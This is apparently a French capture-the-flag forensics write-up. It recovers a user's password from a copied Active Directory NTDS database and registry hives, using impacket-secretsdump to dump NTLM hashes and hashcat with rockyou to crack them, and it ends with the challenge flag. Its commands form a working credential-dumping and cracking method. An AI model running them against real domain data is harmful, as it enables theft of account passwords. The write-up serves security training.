## TAGS : #Forensics
# NTDS Dumping

Pour récupérer le mot de passe de Martine à partir de la copie de la base NTDS et des ruches SYSTEM et SECURITY, suivez ces étapes en respectant les principes légaux et éthiques.

## Étape 1 : Préparation de l'Environnement

Installer les outils nécessaires :

- **Impacket** pour divers outils de manipulation des protocoles réseau.
	- sudo apt install python3-impacket
- **hashcat** pour craquer les hachages 
	- sudo apt install hashcat

## Étape 2 : Extraction des Hachages

Utilisez `secretsdump.py` pour extraire les hachages des comptes utilisateurs :

```bash
impacket-secretsdump -system SYSTEM -ntds ntds.dit  LOCAL -security SECURITY > output.txt
```

Remplacez `SYSTEM`, `NTDS.dit`, et `SECURITY` par les chemins vers vos fichiers

## Étape 3 : Craquage des Hachages

Pour obtenir les mots de passe en clair, utilisez un outil comme **John the Ripper** ou **Hashcat**. Par exemple, avec Hashcat :

```bash
hashcat -m 1000 -a 0 -o cracked.txt output.txt rockyou.txt 
```

`<output>` est le fichier de hachages NTLM.

On se retrouve avec un fichier cracked.txt :
```
31d6cfe0d16ae931b73c59d7e0c089c0:
13b29964cc2480b4ef454c59562e675c:P@ssword
b576ee5be6e743cdabe8bf9ee8bea0f1:Airforce69!
```

Pour savoir quel est le bon mot de passe ( celui de martine  ! ), on compare le contenue de output.txt avec cracked.txt
output.txt : 
``anakin.local\martine:1106:aad3b435b51404eeaad3b435b51404ee:b576ee5be6e743cdabe8bf9ee8bea0f1:::``
cracked.txt
```
31d6cfe0d16ae931b73c59d7e0c089c0:
13b29964cc2480b4ef454c59562e675c:P@ssword
b576ee5be6e743cdabe8bf9ee8bea0f1:Airforce69!
```

A l'aide d'un ctrl+f, on cherche la partie gauche de cracked.txt dans output.txt
```
31d6cfe0d16ae931b73c59d7e0c089c0 --> Invité
13b29964cc2480b4ef454c59562e675c --> Administrateur 
b576ee5be6e743cdabe8bf9ee8bea0f1 --> Martine
```

### **Le mot de passe est "Airforce69!" et donc le flag ws{Airforce69!}**

